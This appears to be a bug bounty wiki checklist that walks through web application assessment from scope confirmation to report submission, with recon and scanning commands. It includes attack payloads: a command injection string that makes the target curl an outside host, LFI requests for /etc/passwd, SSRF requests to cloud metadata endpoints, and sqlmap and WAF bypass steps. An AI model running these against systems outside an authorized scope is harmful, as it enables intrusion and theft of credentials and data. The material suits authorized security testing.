---
type: wiki
category: checklist
status: active
last-updated: 2026-04-21
source: https://github.com/D3n0Duz/WebPentestChecklist + bbflow real-world testing experience
---

# New Target Assessment Checklist

> When you pick up a new Bug Bounty target, run through this checklist top to bottom.
> Each item is annotated with the corresponding **bbflow hunter** / **wiki section** / **manual command**.
> Inspiration: [D3n0Duz/WebPentestChecklist](https://github.com/D3n0Duz/WebPentestChecklist) + accumulated bbflow real-world experience.

## Phase 0 — Scope confirmation (mandatory)

- [ ] Create `$WORKSHOP_ROOT/<target>/SCOPE.md` (full in-scope + OOS + bounty range)
- [ ] Add to the `workshop/PROGRAMS.md` index
- [ ] Confirm the program platform (HackerOne / Bugcrowd / YesWeHack / Intigriti / HITCON)
- [ ] Search disclosed reports + hacktivity to avoid duplicate findings
- [ ] Query the knowledge graph to see if there's prior history
  - Search your KB index or graph tool for prior findings on this target

## Phase 1 — Application Mapping

### 1.1 Subdomain enumeration

```bash
# One-shot
bbflow recon target.com

# Manual
subfinder -d target.com -silent | anew subs.txt
amass enum -passive -d target.com -silent | anew subs.txt
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u | anew subs.txt
```

- [ ] Run `bbflow recon` (subfinder + amass + crt.sh + chaos)
- [ ] Run `httpx` liveness probe (with tech fingerprinting)
- [ ] Produce `alive.txt` (live hosts) + `techs.txt` (tech identification)
- [ ] Classify: prod / non-prod (dev/uat/test/stage/beta)

### 1.2 Tech stack identification

```bash
# httpx + wappalyzer
httpx -l subs.txt -tech-detect -title -status-code -silent | tee techs.txt

# whatweb
whatweb -a 3 https://target.com
```

- [ ] Identify web server (Apache / Nginx / IIS / Caddy)
- [ ] Identify framework (WordPress / Laravel / Spring / Django / Rails / .NET)
- [ ] Identify CDN / WAF (Cloudflare / Akamai / Imperva / SafeLine / AWS)
- [ ] Identify DB (if an error page reveals it)

### 1.3 Port scan

```bash
# Non-standard ports matter too (WAF often only protects 80/443)
rustscan -a target.com --ulimit 5000 -- -sV
naabu -host target.com -top-ports 1000
```

- [ ] Top 1000 ports
- [ ] Pay special attention to: 7001 (WebLogic) / 8080 / 8443 / 8888 / 9000 / 9090 / 27017 (Mongo) / 6379 (Redis)

### 1.4 Content discovery

```bash
# One-shot
bbflow hunt target --only crawl-chain

# Manual
katana -u https://target -d 5 -jc -silent > katana.txt
gau --subs target.com > gau.txt
waybackurls target.com > wayback.txt
cat katana.txt gau.txt wayback.txt | uro > endpoints.txt
```

- [ ] `crawl-chain` hunter completed
- [ ] `sort -u` merge to produce `endpoints.txt`
- [ ] `gf` classification to produce `gf_xss.txt` / `gf_sqli.txt` / etc.

## Phase 2 — Low-noise information leaks (run this first, WAF-friendly)

### 2.1 SCM / config file exposure

```bash
bbflow hunt target --only config-leak,git-exposure,backup-files,sourcemap,envdata
```

Corresponding hunters:
- [ ] **config-leak** — 100+ sensitive paths (wiki [10](10-hunter-config-leak.md))
- [ ] **git-exposure** — `.git/` leak + git-dumper restoration
- [ ] **backup-files** — archive/dump detection (wiki [12](12-hunter-backup-files.md))
- [ ] **sourcemap** — JS source map leaks
- [ ] **envdata** — `window.envData` / config object leaks
- [ ] **hardcoded-js-secrets** — extract tokens/api_key from JS
- [ ] **trufflehog** — scan git history for secrets

### 2.2 Swagger / API docs

```bash
# config-leak scans this too, but you can also confirm manually
for p in /swagger-ui.html /v2/api-docs /v3/api-docs /openapi.json /api-docs /docs; do
  curl -sI "https://target${p}" | head -1
done
```

- [ ] Found Swagger → record the endpoint
- [ ] Check inside for endpoints without auth

### 2.3 Cloud Metadata / S3

```bash
# AWS / GCP / Azure metadata SSRF
nuclei -u https://target -tags ssrf,cloud -silent

# S3 bucket
# Look for subdomains ending in .s3.amazonaws.com
```

## Phase 3 — Authentication and Authorization

### 3.1 Authentication mechanism

- [ ] Registration flow: email verification / phone verification present?
- [ ] Login flow: captcha / rate limit present?
- [ ] **User enumeration**: email enum / username enum (`hunt-user-enum`)
- [ ] **Password reset**: is the token predictable? does the link have a TTL?
- [ ] **Default credentials**: `hunt-weak-login` (wiki [11](11-hunter-weak-login.md))

```bash
bbflow hunt target --only user-enum,weak-login
```

### 3.2 Session management

- [ ] Cookie flags (HttpOnly / Secure / SameSite)
- [ ] Is the session token predictable? (UUID / sequential ID)
- [ ] **JWT**: `alg=none` / weak secret / `kid` injection? (`hunt-jwt`)
- [ ] Session fixation: does the session change before/after login?
- [ ] Logout: does the token actually get invalidated?

```bash
bbflow hunt target --only jwt
```

### 3.3 Authorization testing

- [ ] **IDOR**: try another user's ID on every `/user/:id`
- [ ] **Horizontal**: same-tier roles (user A viewing user B)
- [ ] **Vertical**: low-privilege → high-privilege endpoint
- [ ] **GraphQL**: `__schema` introspection + unauthorized mutations (`hunt-graphql-idor`)

```bash
bbflow hunt target --only graphql-idor
```

## Phase 4 — Input Validation Vulnerabilities

### 4.1 XSS

```bash
# Automated
bbflow hunt target --only crawl-chain,nuclei-deep
CATEGORY=xss "$TOOLS_ROOT/hunters/hunt-nuclei-deep.sh" https://target

# Manual dalfox (the strongest XSS scanner)
dalfox file gf_xss.txt --silence -o dalfox.txt
dalfox url "https://target/search?q=test" --silence
```

- [ ] Reflected XSS (URL param)
- [ ] Stored XSS (form / comment)
- [ ] DOM XSS (JS manipulating `location` / `innerHTML`)

### 4.2 SQL Injection

```bash
# Automated
CATEGORY=sqli "$TOOLS_ROOT/hunters/hunt-nuclei-deep.sh" https://target

# sqlmap manual
sqlmap -u "https://target/page.php?id=1" --batch --random-agent --level 3 --risk 2

# Time-based injection (when there's no error message)
sqlmap -u "https://target/page.php?id=1" --technique=T --time-sec 5
```

- [ ] Error-based (error message leak)
- [ ] Union-based
- [ ] Boolean-based (response differential)
- [ ] Time-based (blind)

### 4.3 Command Injection / RCE

```bash
CATEGORY=rce "$TOOLS_ROOT/hunters/hunt-nuclei-deep.sh" https://target

# Manual test (requires OAST)
curl "https://target/ping?host=127.0.0.1;curl+oast.me/x"
```

- [ ] Parameter injection with `;`, `&&`, `|`, backtick
- [ ] Framework-level RCE (Log4j / Spring4Shell / Shiro / Fastjson / Struts2)
- [ ] Template injection (SSTI)

```bash
CATEGORY=ssti "$TOOLS_ROOT/hunters/hunt-nuclei-deep.sh" https://target
```

### 4.4 Path Traversal / LFI

```bash
CATEGORY=lfi "$TOOLS_ROOT/hunters/hunt-nuclei-deep.sh" https://target

# Manual
curl "https://target/file?name=../../../../etc/passwd"
curl "https://target/file?name=....//....//....//etc/passwd"  # double-dot bypass
```

- [ ] Basic `../`
- [ ] URL encode / double encode
- [ ] Null byte (legacy systems)
- [ ] LFI → RCE (log poisoning / phar://)

### 4.5 XXE

```bash
CATEGORY=xxe "$TOOLS_ROOT/hunters/hunt-nuclei-deep.sh" https://target
```

- [ ] XML upload points
- [ ] SOAP endpoint
- [ ] SVG upload (potential XXE)

### 4.6 SSRF

```bash
CATEGORY=ssrf OAST=1 "$TOOLS_ROOT/hunters/hunt-nuclei-deep.sh" https://target

# Manual
curl "https://target/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS
curl "https://target/fetch?url=http://metadata.google.internal/"          # GCP
```

- [ ] File upload / URL fetch functionality
- [ ] Webhook / callback URL
- [ ] PDF / image generator (HTML → PDF often has SSRF)
- [ ] Import functionality (OAuth redirect_uri)

### 4.7 Open Redirect

```bash
CATEGORY=redirect "$TOOLS_ROOT/hunters/hunt-nuclei-deep.sh" https://target

bbflow hunt target --only open-redirect
```

- [ ] Login redirect param (`?redirect=`)
- [ ] Logout redirect
- [ ] OAuth state (could be CSRF + redirect)

## Phase 5 — Business Logic

Nuclei can't find these — manual testing is required:

- [ ] **Race condition** — send 2 requests simultaneously to test (discount code, transfer)
- [ ] **Price manipulation** — negative numbers / decimals
- [ ] **Coupon reuse** — using the same code multiple times
- [ ] **Workflow bypass** — skip step 2 and go directly to step 4
- [ ] **Auth bypass** — `?auth=1` / `?admin=true`
- [ ] **Mass assignment** — send `isAdmin=true` and see if it's accepted

## Phase 6 — API-specific

### 6.1 REST

- [ ] Unauthorized endpoints (GET/POST that don't require a token)
- [ ] HTTP method differences (`GET /api/users` requires auth but `POST /api/users` doesn't?)
- [ ] Content-Type switching (`application/json` vs `application/xml`)
- [ ] Rate limiting (per-endpoint independent?)

### 6.2 GraphQL

```bash
bbflow hunt target --only graphql-idor

# Manual
curl -X POST https://target/graphql -d '{"query":"{__schema{types{name}}}"}'
```

- [ ] Introspection enabled
- [ ] Query depth limit
- [ ] Field-level auth check (IDOR)
- [ ] Batch attack (`[{...},{...}]`)

### 6.3 WebSocket

- [ ] Origin check
- [ ] Message format

## Phase 7 — CORS / Misc

### 7.1 CORS

```bash
bbflow hunt target --only cors-reflect
```

- [ ] `Access-Control-Allow-Origin: *` + credentials
- [ ] Reflective origin (returns any origin)
- [ ] Null origin allowed
- [ ] Regex bypass

### 7.2 CSRF

- [ ] CSRF token present on sensitive operations?
- [ ] SameSite cookie configuration
- [ ] POST vs GET

### 7.3 Clickjacking

```bash
curl -sI https://target/ | grep -i "x-frame-options\|content-security-policy"
```

- [ ] X-Frame-Options missing
- [ ] frame-ancestors CSP missing

### 7.4 Subdomain Takeover

```bash
bbflow hunt target --only subdomain-takeover
```

## Phase 8 — File Upload

- [ ] Extension bypass (`.php.jpg` / `.php%00.jpg` / `.phtml`)
- [ ] Content-Type bypass
- [ ] SVG upload (XSS / XXE)
- [ ] ZIP upload (ZipSlip)
- [ ] Filename path traversal (`../../shell.php`)

## Phase 9 — WAF Bypass (if blocked)

```bash
bbflow hunt target --only waf-bypass

# Or directly
"$TOOLS_ROOT/hunters/hunt-waf-bypass.sh" https://target
```

See [14-waf-bypass-commands.md](14-waf-bypass-commands.md):
- [ ] Identify the WAF (wafw00f)
- [ ] Find the origin IP (crt.sh + Shodan)
- [ ] Non-standard ports
- [ ] Non-prod subdomains
- [ ] HTTP-layer bypass (header / method / encoding)

## Phase 10 — Final Pre-Submit Check

- [ ] PoC independently reproduced with curl (not relying on the Burp session)
- [ ] Vulnerability type classified precisely (don't pick a VRT category that auto-suggests high severity)
- [ ] Severity matches reality (not inflated to RCE)
- [ ] Cross-checked against the program's disclosed reports for duplicates
- [ ] Impact lists only what's "verified" — theoretical impact goes under Potential
- [ ] Screenshot + description + reproduction steps, all three included
- [ ] Tools used + GitHub URL + install instructions
- [ ] Failed attempts recorded

See [41-checklist-before-submit.md](41-checklist-before-submit.md).

## Suggested time allocation (for an 8-hour target)

| Phase | Time |
|-------|------|
| 0. Scope | 10 min |
| 1. Mapping | 30 min |
| 2. Info leak | 20 min |
| 3. Auth | 1 hour |
| 4. Input vuln | 2 hours |
| 5. Logic | 1 hour |
| 6. API | 1.5 hours |
| 7. Misc | 30 min |
| 8. Upload | 30 min |
| 9. WAF bypass | 20 min (if needed) |
| 10. Report | 40 min |

## Related files

- [00-bbflow-complete-flow.md](00-bbflow-complete-flow.md)
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md)
- [41-checklist-before-submit.md](41-checklist-before-submit.md)
- [WebPentestChecklist](https://github.com/D3n0Duz/WebPentestChecklist)
